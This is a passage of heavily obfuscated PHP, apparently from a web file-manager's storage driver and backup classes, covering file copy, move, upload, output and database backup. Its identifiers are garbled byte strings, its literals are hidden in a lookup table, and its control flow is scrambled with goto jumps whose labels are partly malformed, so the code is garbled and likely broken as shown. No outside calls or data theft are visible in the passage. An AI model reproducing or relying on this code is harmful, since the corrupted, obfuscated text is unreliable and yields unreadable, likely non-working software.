($bè­†Äªàğ == count($f¡İÎ¨Ë”Ş[$b–ªé¤Å¶¶[1118]]) - 1) { $cÀÌù»–ÏŒ = $this->model->mkfile($cÀÌù»–ÏŒ, $fì­›Õƒ, $eò„ğ¾à¯, $C´Ÿéº–ìÔ); break; } $cÀÌù»–ÏŒ = $this->model->mkdir($cÀÌù»–ÏŒ, $fì­›Õƒ, REPEAT_SKIP); } return $this->getPathOuter($cÀÌù»–ÏŒ); } public function mkdir($A¤™³îº÷Ø, $BÊ»¡âˆ…á = REPEAT_SKIP) { $cÙİŞ÷Ä =& $_SERVER[¼€¼ˆ¦‚¡]; $BÓ‹‚Ü‚äÏ = $this->parse($A¤™³îº÷Ø); $A¤™³îº÷Ø = $BÓ‹‚Ü‚äÏ[$cÙİŞ÷Ä[367]]; for ($AÁÈ¦ÎÍÍŸ = 0; $AÁÈ¦ÎÍÍŸ < count($BÓ‹‚Ü‚äÏ[$cÙİŞ÷Ä[1118]]); $AÁÈ¦ÎÍÍŸ++) { $Aƒ£ñŠ´Ğµ = $BÓ‹‚Ü‚äÏ[$cÙİŞ÷Ä[1118]][$AÁÈ¦ÎÍÍŸ]; $A¤™³îº÷Ø = $this->model->mkdir($A¤™³îº÷Ø, $Aƒ£ñŠ´Ğµ, $BÊ»¡âˆ…á); } return $this->getPathOuter($A¤™³îº÷Ø); } public function copyFile($bœÄÎˆéÎ, $E‰ÍêëàØ, $a’¯áŠÌì = REPEAT_REPLACE) { $C­¥ÔÖ‡Ã« =& $_SERVER[¼€¼ˆ¦‚¡]; $cŠÑ‘® Íô = $this->parse($E‰ÍêëàØ); $Aô’Ğ¹˜©÷ = $this->model->copy($bœÄÎˆéÎ, $cŠÑ‘® Íô[$C­¥ÔÖ‡Ã«[367]], $a’¯áŠÌì, $cŠÑ‘® Íô[$C­¥ÔÖ‡Ã«[75]]); return $Aô’Ğ¹˜©÷ ? $this->getPathOuter($Aô’Ğ¹˜©÷) : !1; } public function moveFile($Dµñ¡¡Ùæ¸, $f‡õœ¿ÇÖ´, $F¡èá„’« = REPEAT_REPLACE) { $ašŒ½œ„òˆ =& $_SERVER[¼€¼ˆ¦‚¡]; $bÈ’éÈ¯ÈÔ = $this->parse($f‡õœ¿ÇÖ´); $bÊ¶ÃÓ›’ø = $this->model->move($Dµñ¡¡Ùæ¸, $bÈ’éÈ¯ÈÔ[$ašŒ½œ„òˆ[367]], $F¡èá„’«, $bÈ’éÈ¯ÈÔ[$ašŒ½œ„òˆ[75]]); return $bÊ¶ÃÓ›’ø ? $this->getPathOuter($bÊ¶ÃÓ›’ø) : !1; } public function copy($C¾¿Ó…¨¡, $AÌç¨¨İ¿ô, $A°‘™ƒßÓ = REPEAT_REPLACE) { $Bê††ÄçˆŠ = $this->parse($AÌç¨¨İ¿ô); $dğãªØñ…å = $this->model->copy($C¾¿Ó…¨¡, $Bê††ÄçˆŠ[$_SERVER[¼€¼ˆ¦‚¡][367]], $A°‘™ƒßÓ); return $dğãªØñ…å ? $this->getPathOuter($dğãªØñ…å) : !1; } public function moveSameAllow() { } public function move($cêœé¸ÏŒî, $D¾ì½Š‘È, $e¤î›Úµ¦— = REPEAT_REPLACE) { $E„ÎÑ”ŠãÀ = $this->parse($D¾ì½Š‘È); $CÉŒù = $this->model->move($cêœé¸ÏŒî, $E„ÎÑ”ŠãÀ[$_SERVER[¼€¼ˆ¦‚¡][367]], $e¤î›Úµ¦—); return $CÉŒù ? $this->getPathOuter($CÉŒù) : !1; } public function remove($Cìé–™©æ, $EÛ¸§î®·Ş = true) { return $this->model->remove($Cìé–™©æ, $EÛ¸§î®·Ş); } public function rename($B±·œË½áø, $EàŸÜ¨—ÊŠ) { $aÊ¯ª›Ø¶µ = $this->model->rename($B±·œË½áø, $EàŸÜ¨—ÊŠ); return $aÊ¯ª›Ø¶µ ? $this->getPathOuter($B±·œË½áø) : $aÊ¯ª›Ø¶µ; } public function size($a¼éÓ–ØŒ¼) { $a‰«÷µ¼ø = $this->infoSimple($a¼éÓ–ØŒ¼); return $a‰«÷µ¼ø ? $a‰«÷µ¼ø[$_SERVER[¼€¼ˆ¦‚¡][77]] : 0; } public function infoSimple($CÕ±³•òæ’) { return $this->model->sourceInfo($CÕ±³•òæ’); } public function info($Aêæ™¸Ğê«) { return $this->infoParse($Aêæ™¸Ğê«); } public function infoAuth($DòÂ˜§î) { return $this->infoParse($DòÂ˜§î, !1, !0); } public function infoWithChildren($B‘šéç›) { return $this->infoParse($B‘šéç›, !0); } protected function infoParse($eÙ«ºÚ”¬Ë, $fÙî°õ¥Œ£ = false, $b¥Ü¶á„§ = false) { if (!$fÙî°õ¥Œ£) { return $this->model->pathInfo($eÙ«ºÚ”¬Ë, $b¥Ü¶á„§); } return $this->model->pathInfoMore($eÙ«ºÚ”¬Ë); } public function infoFull($E¶ÅëŸÄŠÄ) { $BŞ†éáçŞŠ =& $_SERVER[¼€¼ˆ¦‚¡]; $f¯ä…šÛÜÀ = explode($BŞ†éáçŞŠ[8], $E¶ÅëŸÄŠÄ); $D ¾Ø¹ÒÚÒ = implode($BŞ†éáçŞŠ[8], array_splice($f¯ä…šÛÜÀ, 1)); return $this->model->pathInfoByPath($f¯ä…šÛÜÀ[0], $D ¾Ø¹ÒÚÒ); } public function hashSimple($a’…›ƒß„ğ) { $d‡¡öº‹Åğ =& $_SERVER[¼€¼ˆ¦‚¡]; $B–Óº‰ÊÑ† = $this->infoWithChildren($a’…›ƒß„ğ); return $B–Óº‰ÊÑ†[$d‡¡öº‹Åğ[162]][$d‡¡öº‹Åğ[164]]; } public function hashMd5($d°Ã¸î¡ôö) { $D‚µ¨±˜¤‰ =& $_SERVER[¼€¼ˆ¦‚¡]; $f÷àøŸ‚ÖÀ = $this->infoWithChildren($d°Ã¸î¡ôö); return $f÷àøŸ‚ÖÀ[$D‚µ¨±˜¤‰[162]][$D‚µ¨±˜¤‰[163]]; } public function exist($EÊÕâí‘Äã) { $D›ª‰¥‚È =& $_SERVER[¼€¼ˆ¦‚¡]; $F÷éØ‘Ï« = $this->parse($EÊÕâí‘Äã); if (!$F÷éØ‘Ï«[$D›ª‰¥‚È[75]]) { return $this->isFile($EÊÕâí‘Äã) || $this->isFolder($EÊÕâí‘Äã); } $FÙôà©‰ß = array($D›ª‰¥‚È[368] => $F÷éØ‘Ï«[$D›ª‰¥‚È[367]], $D›ª‰¥‚È[28] => $F÷éØ‘Ï«[$D›ª‰¥‚È[75]]); $bƒÓ´©ÑÈ† = $this->model->where($FÙôà©‰ß)->find(); return $bƒÓ´©ÑÈ† ? !0 : !1; } public function isFile($fè»›äƒÍÑ) { $dËóªâ‚§º =& $_SERVER[¼€¼ˆ¦‚¡]; $có®œŸË = $this->infoSimple($fè»›äƒÍÑ); return $có®œŸË && $có®œŸË[$dËóªâ‚§º[370]] == $dËóªâ‚§º[83] ? !1 : !0; } public function isFolder($A¤ÒÙ­²Çç) { $féÊ ÍÖà =& $_SERVER[¼€¼ˆ¦‚¡]; $F»òÂâÜğ¦ = $this->infoSimple($A¤ÒÙ­²Çç); return $F»òÂâÜğ¦ && $F»òÂâÜğ¦[$féÊ ÍÖà[370]] == $féÊ ÍÖà[83] ? !0 : !1; } public function listPath($BÜ÷´“‚õ¨, $b’ŠäŒß¿‹ = false) { $AÓÉ‰ò†àã =& $_SERVER[¼€¼ˆ¦‚¡]; if ($BÜ÷´“‚õ¨ == $AÓÉ‰ò†àã[33]) { return !1; } $cô­£¨‘À÷ = array($AÓÉ‰ò†àã[368] => $BÜ÷´“‚õ¨); if ($b’ŠäŒß¿‹) { return $this->model->listSource($cô­£¨‘À÷, -1); } return $this->model->listSource($cô­£¨‘À÷); } public function has($B‰Ùìß¡­È, $cÑêªº½Ä = false, $b‚˜ÙøÇ• = null) { $B‡™¹ª¸÷ =& $_SERVER[¼€¼ˆ¦‚¡]; $E§Ş†ƒ‚ = $this->infoWithChildren($B‰Ùìß¡­È); if ($cÑêªº½Ä) { return array($B‡™¹ª¸÷[192] => $E§Ş†ƒ‚[$B‡™¹ª¸÷[192]], $B‡™¹ª¸÷[191] => $E§Ş†ƒ‚[$B‡™¹ª¸÷[191]]); } return $b‚˜ÙøÇ• ? $E§Ş†ƒ‚[$B‡™¹ª¸÷[192]] : $E§Ş†ƒ‚[$B‡™¹ª¸÷[191]]; } public function listAll($DˆÄ·§‹§ƒ) { $cĞÉÎ“Âº = IO::info($this->pathParse[$_SERVER[¼€¼ˆ¦‚¡][75]]); if (!$cĞÉÎ“Âº) { return array(); } return $this->model->listAll($DˆÄ·§‹§ƒ); } public function getContent($a‘»š¶ÈÄ) { return $this->model->getContent($a‘»š¶ÈÄ); } public function setContent($DÂá‹Œßæˆ, $A£ŒÀ¹ÃÒ× = '') { return $this->model->setContent($DÂá‹Œßæˆ, $A£ŒÀ¹ÃÒ×); } public function fileSubstr($DàšåñŸìµ, $C§ù›ã±§„, $eÄÖ´‰ªÑÑ) { return $this->model->fileSubstr($DàšåñŸìµ, $C§ù›ã±§„, $eÄÖ´‰ªÑÑ); } public function download($bÌÑÏâô…, $EìŠÄŠ¿Ÿ = '') { $eœŠÜáÙ‚— = get_path_father($EìŠÄŠ¿Ÿ); $dª¯â¦Â = get_path_this($EìŠÄŠ¿Ÿ); $BÅ™Ô¯ğÎÍ = $this->model->fileInfoGet($bÌÑÏâô…); $CìˆÁë±ƒ÷ = IO::copy($BÅ™Ô¯ğÎÍ[$_SERVER[¼€¼ˆ¦‚¡][75]], $eœŠÜáÙ‚—, !1, $dª¯â¦Â); return $CìˆÁë±ƒ÷; } public function setModifyTime($A‘¤¡ˆÉ‹á, $e©ãó¾·ôÜ = '') { $this->model->metaSet($A‘¤¡ˆÉ‹á, $_SERVER[¼€¼ˆ¦‚¡][1119], $e©ãó¾·ôÜ); } public function upload($Aë®¾í¸ã, $CÁ¾ŞêÛ, $a¨µ¡åÙò = false, $AÓ¾È¿™”õ = REPEAT_REPLACE) { $eäº‘£ë² =& $_SERVER[¼€¼ˆ¦‚¡]; $EœìÂ½¯ = $this->parse($Aë®¾í¸ã); $bë™­İª¤£ = $this->model->addFile($EœìÂ½¯[$eäº‘£ë²[367]], $CÁ¾ŞêÛ, $EœìÂ½¯[$eäº‘£ë²[75]], $a¨µ¡åÙò, $AÓ¾È¿™”õ); return $this->getPathOuter($bë™­İª¤£); } public function uploadFileByID($EÆ‹Ç›“†, $b¹¦†×õœÈ, $e¥ÕÆØË¦) { $d…¥‰‡ÖçŒ =& $_SERVER[¼€¼ˆ¦‚¡]; $e´ÆŸêñ—Œ = $this->parse($EÆ‹Ç›“†); $a×¸›ÔË¼´ = $this->model->addFileByFileID($e´ÆŸêñ—Œ[$d…¥‰‡ÖçŒ[367]], $b¹¦†×õœÈ, $e´ÆŸêñ—Œ[$d…¥‰‡ÖçŒ[75]], $e¥ÕÆØË¦); return $this->getPathOuter($a×¸›ÔË¼´); } public function addFileByRemote($CÜ®ÌÑìÃƒ, $f¿çá‘Ü‹…, $dø­Î¾°ÁŒ = array(), $aĞ«Åæ¿Š‚ = '', $c’ÂÒó¦Îè) { $CŞˆóÅŞø½ =& $_SERVER[¼€¼ˆ¦‚¡]; $f·±…ãö‹ = $this->parse($CÜ®ÌÑìÃƒ); $aĞ«Åæ¿Š‚ = empty($aĞ«Åæ¿Š‚) ? $f·±…ãö‹[$CŞˆóÅŞø½[75]] : $aĞ«Åæ¿Š‚; $C‰¼ƒ·°à = $this->model->addFileByRemote($f·±…ãö‹[$CŞˆóÅŞø½[367]], $f¿çá‘Ü‹…, $aĞ«Åæ¿Š‚, $dø­Î¾°ÁŒ, $c’ÂÒó¦Îè); return $this->getPathOuter($C‰¼ƒ·°à); } public function uploadLink($aì™ÑËğŸ, $c‚æ©Ùñ¯Î = 0) { $cÁÆˆ•Ôº =& $_SERVER[¼€¼ˆ¦‚¡]; $cğÜ—‡»— = $this->parse($aì™ÑËğŸ); $aì™ÑËğŸ = Model($cÁÆˆ•Ôº[544])->createFileName($cğÜ—‡»—[$cÁÆˆ•Ôº[75]]); $fÊ‰¨ô×îˆ = IO::uploadLink($aì™ÑËğŸ, $c‚æ©Ùñ¯Î); return $fÊ‰¨ô×îˆ; } public function fileNameAuto($DŞ…ğİ‘®‘, $C¦ì…ä»’, $F°øŠÎ¾¢ = REPEAT_REPLACE, $CøÊ×¾ÉÅ = false) { return $this->model->fileNameAuto($DŞ…ğİ‘®‘, $C¦ì…ä»’, $F°øŠÎ¾¢, $CøÊ×¾ÉÅ); } public function fileNameExist($Eæè¥Ÿ, $fñ·é²ÅÑ³) { return $this->model->fileNameExist($Eæè¥Ÿ, $fñ·é²ÅÑ³); } protected function _fileOut($Cƒ³ÈÁø¤æ, $aÜŠï’ë‘ = false, $AºÓ­ŒÌó = false, $d¾Øö¢Ÿ†Ö = '', $e—°àâ¦‘˜ = false) { goto e…ºÓƒ†ó; e…ºÓƒ†ó: $Bò›Š¼‰‹« =& $_SERVER[¼€¼ˆ¦‚¡]; $A’™ÓàÎÁÆ = $this->model->sourceInfo($Cƒ³ÈÁø¤æ); if ($A’™ÓàÎÁÆ[$Bò›Š¼‰‹«[370]] == $Bò›Š¼‰‹«[83]) { header($Bò›Š¼‰‹«[1120]); die; } goto D…ÀáŠ×İÜ; D…ÀáŠ×İÜ: $Añî¸ã¼ŞÙ = $this->model->fileInfoGet($Cƒ³ÈÁø¤æ); $d¾Øö¢Ÿ†Ö = $Añî¸ã¼ŞÙ[$Bò›Š¼‰‹«[163]] ? $Añî¸ã¼ŞÙ[$Bò›Š¼‰‹«[163]] : $d¾Øö¢Ÿ†Ö; $E¸İ¯Èœ©Ú = isset($GLOBALS[$Bò›Š¼‰‹«[1121]]) ? $GLOBALS[$Bò›Š¼‰‹«[1121]] : $A’™ÓàÎÁÆ[$Bò›Š¼‰‹«[28]]; goto CÏˆšó¤ ; CÏˆšó¤ : if ($e—°àâ¦‘˜) { return IO::fileOutServer($Añî¸ã¼ŞÙ[$Bò›Š¼‰‹«[75]], $aÜŠï’ë‘, $E¸İ¯Èœ©Ú, $d¾Øö¢Ÿ†Ö); } IO::fileOut($Añî¸ã¼ŞÙ[$Bò›Š¼‰‹«[75]], $aÜŠï’ë‘, $E¸İ¯Èœ©Ú, $d¾Øö¢Ÿ†Ö); goto dÖåáğªÆ¹; dÖåáğªÆ¹: } public function fileOut($bé»Ì…¬ÕÉ, $e¢ñò©æÕ = false, $DãÁÎœéÛŞ = false, $Cäøº‘‚™Ç = '') { $this->_fileOut($bé»Ì…¬ÕÉ, $e¢ñò©æÕ, $DãÁÎœéÛŞ, $Cäøº‘‚™Ç); } public function fileOutServer($däÇí©®£±, $dä¤Øô—Ø = false, $E—œ¶†÷Ü = false, $Fåôùò¶«ö = '') { $this->_fileOut($däÇí©®£±, $dä¤Øô—Ø, $E—œ¶†÷Ü, $Fåôùò¶«ö, !0); } protected function _fileOutImage($d“£öÇ’í, $Dî™¬ˆ”’ = 250) { $a…™Õ¶©ÖÅ =& $_SERVER[¼€¼ˆ¦‚¡]; $C«Ç•ÁÀ‡ = $this->model->sourceInfo($d“£öÇ’í); if ($C«Ç•ÁÀ‡[$a…™Õ¶©ÖÅ[370]] == $a…™Õ¶©ÖÅ[83]) { show_json($a…™Õ¶©ÖÅ[1122] . $d“£öÇ’í, !1); } $GLOBALS[$a…™Õ¶©ÖÅ[1121]] = $C«Ç•ÁÀ‡[$a…™Õ¶©ÖÅ[28]]; $Fµß°™˜ïå = $this->model->fileInfoGet($d“£öÇ’í); IO::fileOutImage($Fµß°™˜ïå[$a…™Õ¶©ÖÅ[75]], $Dî™¬ˆ”’); } public function fileOutImage($a’æ£Êâ, $cöƒ…ª‡ = 250) { $this->_fileOutImage($a’æ£Êâ, $cöƒ…ª‡); } public function fileOutImageServer($A‰‹¿™„Œ¥, $a‡‘‘–†˜³ = 250) { $this->_fileOutImage($A‰‹¿™„Œ¥, $a‡‘‘–†˜³); } public function link($D§ù©ÙÇ, $CÉñ¼ë¢ÃÆ = '') { $C‹Ò™ãÚË¤ = $this->model->fileInfoGet($D§ù©ÙÇ); return IO::link($C‹Ò™ãÚË¤[$_SERVER[¼€¼ˆ¦‚¡][75]], $CÉñ¼ë¢ÃÆ); } protected function parse($fŸ„Äë¸Š) { $e÷¤…†ß¹ =& $_SERVER[¼€¼ˆ¦‚¡]; if (strstr($fŸ„Äë¸Š, $e÷¤…†ß¹[8]) === !1) { return array($e÷¤…†ß¹[385] => intval($fŸ„Äë¸Š), $e÷¤…†ß¹[75] => $e÷¤…†ß¹[33], $e÷¤…†ß¹[1118] => array()); } $EÀƒ•‹ƒ¨ = explode($e÷¤…†ß¹[8], trim($fŸ„Äë¸Š, $e÷¤…†ß¹[8])); if (count($EÀƒ•‹ƒ¨) < 2) { show_tips($fŸ„Äë¸Š . $e÷¤…†ß¹[1123]); } return array($e÷¤…†ß¹[385] => intval($EÀƒ•‹ƒ¨[0]), $e÷¤…†ß¹[75] => $EÀƒ•‹ƒ¨[1], $e÷¤…†ß¹[1118] => array_slice($EÀƒ•‹ƒ¨, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($c™è¡š‡Ó¥) { $this->pathParse = $c™è¡š‡Ó¥; $this->model = Model($_SERVER[¼€¼ˆ¦‚¡][1117]); } public function getPathOuter($A†šÖ®œÂ) { $cªÆ“ŠÇê÷ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$A†šÖ®œÂ) { return $A†šÖ®œÂ; } $E•„Ÿ•Ì = $this->parse($A†šÖ®œÂ); return trim(KodIO::makeShare($this->pathParse[$cªÆ“ŠÇê÷[367]], $E•„Ÿ•Ì[$cªÆ“ŠÇê÷[367]]), $cªÆ“ŠÇê÷[8]); } protected function infoParse($CáÈ¾²óµ, $bÕÜ‚ÇŞ‚ = false, $CâˆóÜØšƒ = false) { $EÛ£Éô¿Æ² =& $_SERVER[¼€¼ˆ¦‚¡]; $bøš•Úî ö = $this->pathParse[$EÛ£Éô¿Æ²[367]]; $bÕê´äçŸ = trim($this->pathParse[$EÛ£Éô¿Æ²[1011]], $EÛ£Éô¿Æ²[8]); return Action($EÛ£Éô¿Æ²[1124])->sharePathInfo($bøš•Úî ö, $bÕê´äçŸ); } public function infoFull($a ‚¯­Š–ò) { $E³Šî‹‹ì =& $_SERVER[¼€¼ˆ¦‚¡]; $eí–ÏÁíõ© = explode($E³Šî‹‹ì[8], trim($a ‚¯­Š–ò, $E³Šî‹‹ì[8])); if (count($eí–ÏÁíõ©) > 1) { $døÛîÌÓåÚ = implode($E³Šî‹‹ì[8], array_splice($eí–ÏÁíõ©, 1)); $AÆ¤›áøÌ¯ = $this->model->pathInfoByPath($eí–ÏÁíõ©[0], $døÛîÌÓåÚ); if (!$AÆ¤›áøÌ¯) { return !1; } $this->pathParse[$E³Šî‹‹ì[1011]] = $AÆ¤›áøÌ¯[$E³Šî‹‹ì[369]]; } return $this->infoParse($a ‚¯­Š–ò); } public function listAll($c ³ğï¼í…) { goto Bï‰Æß¼Ó; EÃ¥É±’ö½: $aò†Üİ¥ñ = $this->model->listAll($c ³ğï¼í…); $A¦×Á¤³´­ = Model($FŒËîÉßá—[536])->getInfo($Aî¢‰í“¥¨[$FŒËîÉßá—[441]]); $C ÈâŒŠñˆ = Action($FŒËîÉßá—[1124]); goto dÑÂò›¨´¨; dÑÂò›¨´¨: foreach ($aò†Üİ¥ñ as &$fŠ±Ï›Ğ¡) { check_abort(); $fŠ±Ï›Ğ¡[$FŒËîÉßá—[391]] = $C ÈâŒŠñˆ->_shareItemeParse($fŠ±Ï›Ğ¡[$FŒËîÉßá—[391]], $A¦×Á¤³´­); } return $aò†Üİ¥ñ; goto DÛç¦ôÖ¶; Bï‰Æß¼Ó: $FŒËîÉßá— =& $_SERVER[¼€¼ˆ¦‚¡]; $Aî¢‰í“¥¨ = IO::info($this->pathParse[$FŒËîÉßá—[75]]); if (!$Aî¢‰í“¥¨) { return array(); } goto EÃ¥É±’ö½; DÛç¦ôÖ¶: } } goto FŠâ÷óˆÆƒ; C‡‚éÂÒœç: function beforeShutdownFatalError($f·ÏšÂÃºÂ) { think_exception($f·ÏšÂÃºÂ); } $_SERVER[$_SERVER[¿‰šÇ ][48]] = $d½œÉâ×öÒ($_SERVER[$_SERVER[¿‰šÇ ][45]]); $dÊ¶ÏíÙÇ¤ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto B¡À¥Œ®Ë; c¾éÁ¥‰ãÒ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto FÎ–¡¾Œ÷ã; FÎ–¡¾Œ÷ã: $bõÁšö»‘ =& $_SERVER[¼€¼ˆ¦‚¡]; $CÀÜîÃÅİÀ = Backup::get(); self::$io = $CÀÜîÃÅİÀ[$bõÁšö»‘[687]]; goto f¸©ÇœøÃ; E‚¶İùÏ‡: Backup::set($CœóÈ¸Şèö); return !0; goto cùí÷ÑµÁë; f¸©ÇœøÃ: self::$name = $CÀÜîÃÅİÀ[$bõÁšö»‘[28]]; $cŒƒùõ³ÆÓ = $GLOBALS[$bõÁšö»‘[6]][$bõÁšö»‘[17]]; $fê’–¥Ìö = $this->_dbType($cŒƒùõ³ÆÓ); goto c³ö˜ù®æ; C¿ØŠ‰“Ö: mk_dir($dêäİ¤ò³); $fÁ¤Â©…¦Ú = $AÔî¹”ÛŞò = 0; $Bƒé†÷¬Š× = $d©¥È¢ƒè¥->db()->getTables(); goto C›­æ¯¶¡à; Aã¨•›œï¢: foreach ($Bƒé†÷¬Š× as $EÓÄâÊùàá) { $Cƒ‰¨ÓÄ”» = $dêäİ¤ò³ . $EÓÄâÊùàá . $bõÁšö»‘[714]; $BÖ¡ª…ÉØ = null; if ($EÓÄâÊùàá == $bõÁšö»‘[715] && (!isset($CÀÜîÃÅİÀ[$bõÁšö»‘[688]]) || $CÀÜîÃÅİÀ[$bõÁšö»‘[688]] == $bõÁšö»‘[468])) { $BÖ¡ª…ÉØ = self::$io; } $AÔî¹”ÛŞò += $d©¥È¢ƒè¥->sqlFromDb($EÓÄâÊùàá, $Cƒ‰¨ÓÄ”», $E„œŠã¹Ü, $BÖ¡ª…ÉØ); } $E„œŠã¹Ü->end(); $CœóÈ¸Şèö = array($bõÁšö»‘[716] => $fê’–¥Ìö, $bõÁšö»‘[703] => 1, $bõÁšö»‘[717] => $AÔî¹”ÛŞò, $bõÁšö»‘[718] => $AÔî¹”ÛŞò); goto E‚¶İùÏ‡; c³ö˜ù®æ: $d©¥È¢ƒè¥ = new DbManage($cŒƒùõ³ÆÓ, $fê’–¥Ìö); $dêäİ¤ò³ = TEMP_FILES . $bõÁšö»‘[706] . self::$name . $bõÁšö»‘[8]; del_dir($dêäİ¤ò³); goto C¿ØŠ‰“Ö; C›­æ¯¶¡à: $Bƒé†÷¬Š× = array_diff($Bƒé†÷¬Š×, array($bõÁšö»‘[707], $bõÁšö»‘[708])); foreach ($Bƒé†÷¬Š× as $EÓÄâÊùàá) { $fÁ¤Â©…¦Ú += $d©¥È¢ƒè¥->model($EÓÄâÊùàá)->count(); } $E„œŠã¹Ü = new Task($bõÁšö»‘[709], $bõÁšö»‘[710], $fÁ¤Â©…¦Ú, LNG($bõÁšö»‘[711]) . $bõÁšö»‘[712] . LNG($bõÁšö»‘[713])); goto Aã¨•›œï¢; cùí÷ÑµÁë: } private function _dbType($Cİä”¶ƒ…œ) { goto c¶Ì¨˜‚í; c¶Ì¨˜‚í: $d®ğå‘‡Íó =& $_SERVER[¼€¼ˆ¦‚¡]; $Cİä”¶ƒ…œ = array_change_key_case($Cİä”¶ƒ…œ); $b„§šÁ§– = $Cİä”¶ƒ…œ[$d®ğå‘‡Íó[719]]; goto BÊÀŸî¸Â‘; BÊÀŸî¸Â‘: if ($b„§šÁ§– == $d®ğå‘‡Íó[720]) { $DØ¨…Æšê» = explode($d®ğå‘‡Íó[4], $Cİä”¶ƒ…œ[$d®ğå‘‡Íó[721]]); $b„§šÁ§– = $DØ¨…Æšê»[0]; } $A……õ¯‘Ò = array($d®ğå‘‡Íó[722] => $d®ğå‘‡Íó[9], $d®ğå‘‡Íó[723] => $d®ğå‘‡Íó[724]); if (isset($A……õ¯‘Ò[$b„§šÁ§–])) { $b„§šÁ§– = $A……õ¯‘Ò[$b„§šÁ§–]; } goto AÙ§¦‡×•; AÙ§¦‡×•: return $b„§šÁ§–; goto E¡Ãä±„õÎ; E¡Ãä±„õÎ: } } class BackupDbFile { public function __construct() { } public function index() { goto Fˆ¨Š‰Ù°»; F¸ï‰Ú‡éŠ: $b±ªµËß = new TaskFileTransfer($D·ƒ”£[725], $D·ƒ”£[710], 0, LNG($D·ƒ”£[711]) . $D·ƒ”£[412] . LNG($D·ƒ”£[713]) . $D·ƒ”£[726]); $b±ªµËß->addPath($C«®Âæ›î¾); $fè’Û¢—ğó = IO::infoWithChildren($C«®Âæ›î¾); goto B±½¯»³™Ğ; Fˆ¨Š‰Ù°»: $D·ƒ”£ =& $_SERVER[¼€¼ˆ¦‚¡]; $A¯Ş§ì·ù = Backup::get(); $CˆÓ“À—Š = $A¯Ş§ì·ù[$D·ƒ”£[28]]; goto Aé¶¥«°‘’; Aé¶¥«°‘’: $C«®Âæ›î¾ = TEMP_FILES . "\x62\141\143\x6b\x75\160\x5f{$CˆÓ“À—Š}\x2f"; $C’¾¥ÆÅò = "\x7b\x69\157\72{$A¯Ş§ì·ù[$D·ƒ”£[687]]}\x7d\57\x64\x61\x74\141\x62\x61\163\x65\x2f"; IO::mkdir($C’¾¥ÆÅò . "\142\x61\x63\x6b\x75\x70\137{$CˆÓ“À—Š}\57"); goto F¸ï‰Ú‡éŠ; eù†à¥ ¼: $a¦Ä­ ¡É = CONTROLLER_DIR . $D·ƒ”£[729]; IO::copy($a¥«ÜšìÈİ, $C’¾¥ÆÅò . "\142\x61\x63\153\x75\160\x5f{$CˆÓ“À—Š}\57"); IO::copy($a¦Ä­ ¡É, $C’¾¥ÆÅò . "\x62\x61\x63\153\x75\160\x5f{$CˆÓ“À—Š}\57"); goto Fğ÷Ñ·ó¾ì; B±½¯»³™Ğ: Backup::set(array($D·ƒ”£[727] => $fè’Û¢—ğó[$D·ƒ”£[77]])); IO::move($C«®Âæ›î¾, $C’¾¥ÆÅò); $a¥«ÜšìÈİ = CONTROLLER_DIR . $D·ƒ”£[728]; goto eù†à¥ ¼; Fğ÷Ñ·ó¾ì: $b±ªµËß->end(); Backup::set(array($D·ƒ”£[730] => $fè’Û¢—ğó[$D·ƒ”£[77]])); return !0; goto B¡‡Â™Ñ½†; B¡‡Â™Ñ½†: } } class BackupFile { public function __construct() { } public function index() { goto a²ˆ²ãô³; dµ³¦¶‰ÉŒ: $eÚ¯„Á¨ÀÇ->task[$_SERVER[¼€¼ˆ¦‚¡][694]] = $cªÂ­Ç£Éç; $C£¯¶¢Ô¶” = array($_SERVER[¼€¼ˆ¦‚¡][735] => $Aíö­Ãš³×, $_SERVER[¼€¼ˆ¦‚¡][736] => $cªÂ­Ç£Éç); Backup::set($C£¯¶¢Ô¶”); goto cÄëùÛ´ÍÛ; E‚ö„Ñ·®: $A…«ÃÈ¹¼Ê = 1000; $eœõ’ÀêÉÛ = $DÁÑà˜„­â = 0; $cÎË¥×—¦ = array(); goto bšõÑ‘”¯‚; AùĞ§ÓŒÎÈ: $Aíö­Ãš³× = (int) Model($_SERVER[¼€¼ˆ¦‚¡][715])->where($f®Æ¿ï™Ê¦)->count($_SERVER[¼€¼ˆ¦‚¡][419]); $cªÂ­Ç£Éç = (int) Model($_SERVER[¼€¼ˆ¦‚¡][715])->where($f®Æ¿ï™Ê¦)->sum($_SERVER[¼€¼ˆ¦‚¡][77]); $eÚ¯„Á¨ÀÇ = new TaskFileTransfer($_SERVER[¼€¼ˆ¦‚¡][733], $_SERVER[¼€¼ˆ¦‚¡][710], $Aíö­Ãš³×, LNG($_SERVER[¼€¼ˆ¦‚¡][711]) . $_SERVER[¼€¼ˆ¦‚¡][712] . LNG($_SERVER[¼€¼ˆ¦‚¡][734])); goto dµ³¦¶‰ÉŒ; fµŠ‚øŒÏğ: $b…¾“ãËœ = $fÆ´¡‚¼Ó ? 1 : 0; $C£¯¶¢Ô¶” = array($_SERVER[¼€¼ˆ¦‚¡][747] => 1, $_SERVER[¼€¼ˆ¦‚¡][699] => time(), $_SERVER[¼€¼ˆ¦‚¡][705] => $b…¾“ãËœ, $_SERVER[¼€¼ˆ¦‚¡][744] => $dÌÒ‰ºöÊ, $_SERVER[¼€¼ˆ¦‚¡][736] => $cªÂ­Ç£Éç, $_SERVER[¼€¼ˆ¦‚¡][735] => $Aíö­Ãš³×); if ($DÁÑà˜„­â) { $C£¯¶¢Ô¶”[$_SERVER[¼€¼ˆ¦‚¡][745]] = $B¢Ş¹ îó; $C£¯¶¢Ô¶”[$_SERVER[¼€¼ˆ¦‚¡][746]] = $fÛÖ¥ˆ±ÓÂ; } goto AŠÃÚéã…‰; a²ˆ²ãô³: $EìÜ‚Ûª—ƒ = Backup::get(); $dÌÒ‰ºöÊ = $EìÜ‚Ûª—ƒ[$_SERVER[¼€¼ˆ¦‚¡][281]][$_SERVER[¼€¼ˆ¦‚¡][167]][$_SERVER[¼€¼ˆ¦‚¡][419]]; $f®Æ¿ï™Ê¦ = array($_SERVER[¼€¼ˆ¦‚¡][420] => array($_SERVER[¼€¼ˆ¦‚¡][731], $dÌÒ‰ºöÊ), $_SERVER[¼€¼ˆ¦‚¡][732] => array($_SERVER[¼€¼ˆ¦‚¡][319], $EìÜ‚Ûª—ƒ[$_SERVER[¼€¼ˆ¦‚¡][687]])); goto AùĞ§ÓŒÎÈ; cÄëùÛ´ÍÛ: $fÆ´¡‚¼Ó = !0; 